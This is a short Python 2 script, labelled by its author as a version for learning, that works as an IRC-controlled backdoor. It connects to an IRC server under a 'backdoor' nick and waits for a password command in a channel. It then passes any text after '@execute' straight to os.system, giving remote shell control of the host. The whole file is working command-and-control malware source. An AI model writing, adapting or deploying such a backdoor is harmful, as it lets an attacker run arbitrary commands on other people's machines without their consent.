#! /usr/bin/env python
#coding: utf-8
#by: mHarcos Nesster 
#versão para aprendizado!
import time 
import socket,os
import sys
import random
from re import search

server =  "irc.freenode.net"
canal = "#canal"
porta = 6667
nick =  "backdoor"
senha = "123456"

com = str(random.randint(0,10000))
con =  random.choice("asndsabsiandsiadmsadpmdsapd")
nick += com 

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((server, porta))
s.send("NICK %s\r\n"%(nick))
s.send("USER "+ nick+" "+ nick +" "+ nick +" :.\n")
s.send("Join %s\r\n" %(canal))
time.sleep(2)
print s.recv(1024)

verificar = False
while verificar != True:
	msg = s.recv(5000)
	print msg
	if msg[0:4] == "PING":
              s.send(msg.replace("PING", "PONG"))

	if search("@conectar %s" % senha, msg):
		s.send("PRIVMSG %s : --> Conectado com sucesso! \r\n" % canal)
		verificar = True
while(1):
	msg = s.recv(5000)
	print msg

        if msg[0:4] == "PING":
              s.send(msg.replace("PING", "PONG"))
	if search("@execute", msg):
		msg = msg.split("@execute")		
		msg = msg[1].split("\r\n")
		os.system(msg[0])
		s.send("PRIVMSG %s : comando executado OK \r\n" % canal)
